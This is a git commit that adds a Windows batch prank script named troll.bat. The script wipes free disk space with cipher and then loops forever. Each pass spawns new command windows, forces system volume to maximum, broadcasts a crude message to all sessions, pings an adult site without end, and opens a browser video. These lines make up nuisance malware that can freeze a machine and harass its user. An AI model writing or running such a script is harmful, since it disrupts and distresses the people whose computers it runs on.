fcfcb1e3c6ee4065df9b30e5cc959936165a90d6
rxt01 <116683923+rxt01@users.noreply.github.com>
2023-01-22 22:16:36 -0500

    Create troll.bat

---
+++ scrypts/windows/troll.bat
@@ -0,0 +1,14 @@
+cipher /w:C:
+:A
+prompt BRO GOT HACKED
+cscript ..error.vbs
+Color -2
+title hacked
+nircmd.exe mutesysvolume 0
+nircmd.exe setsysvolume 65535
+msg * nobitches
+ping -t pornhub.com
+START
+START
+start msedge.exe https://youtu.be/dQw4w9WgXcQ
+goto A
